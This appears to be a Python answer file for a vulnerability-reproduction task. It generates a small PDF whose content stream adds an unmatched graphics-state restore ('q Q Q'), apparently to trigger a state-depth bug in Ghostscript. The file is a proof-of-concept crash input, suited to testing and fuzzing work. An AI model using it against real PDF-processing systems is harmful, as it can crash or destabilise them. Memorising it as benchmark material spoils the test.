import os
import tarfile
from typing import Optional


def _build_minimal_pdf_with_stream(stream_data: bytes) -> bytes:
    if not stream_data.endswith(b"\n"):
        stream_data += b"\n"

    header = b"%PDF-1.4\n%\xe2\xe3\xcf\xd3\n"

    obj1 = b"1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n"
    obj2 = b"2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n"
    obj3 = (
        b"3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 1 1] "
        b"/Resources << >> /Contents 4 0 R >>\nendobj\n"
    )

    stream_dict = b"<< /Length " + str(len(stream_data)).encode("ascii") + b" >>\n"
    obj4 = b"4 0 obj\n" + stream_dict + b"stream\n" + stream_data + b"endstream\nendobj\n"

    objects = [obj1, obj2, obj3, obj4]

    offsets = [0] * (len(objects) + 1)
    pos = len(header)
    for i, o in enumerate(objects, start=1):
        offsets[i] = pos
        pos += len(o)

    xref_pos = pos
    xref = bytearray()
    xref.extend(b"xref\n")
    xref.extend(b"0 " + str(len(objects) + 1).encode("ascii") + b"\n")
    xref.extend(b"0000000000 65535 f \n")
    for i in range(1, len(objects) + 1):
        xref.extend(f"{offsets[i]:010d} 00000 n \n".encode("ascii"))

    trailer = (
        b"trailer\n<< /Size "
        + str(len(objects) + 1).encode("ascii")
        + b" /Root 1 0 R >>\nstartxref\n"
        + str(xref_pos).encode("ascii")
        + b"\n%%EOF\n"
    )

    return header + b"".join(objects) + bytes(xref) + trailer


def _looks_like_ghostscript_tarball(src_path: str) -> bool:
    try:
        if os.path.isdir(src_path):
            for root, _, files in os.walk(src_path):
                for fn in files:
                    if fn in ("gdevpdf.c", "gdevpdfx.h", "gs.c"):
                        return True
            return False
        with tarfile.open(src_path, "r:*") as tf:
            names = tf.getnames()
            for n in names:
                base = os.path.basename(n)
                if base in ("gdevpdf.c", "gdevpdfx.h", "gs.c"):
                    return True
            for n in names[:2000]:
                if "ghostscript" in n.lower() or "gdevpdf" in n.lower():
                    return True
    except Exception:
        return False
    return False


class Solution:
    def solve(self, src_path: str) -> bytes:
        _ = _looks_like_ghostscript_tarball(src_path)  # best-effort; PoC is PDF regardless
        # Try to trigger viewer-state restore with insufficient depth:
        # include a matched save/restore and an extra restore.
        stream = b"q\nQ\nQ\n"
        return _build_minimal_pdf_with_stream(stream)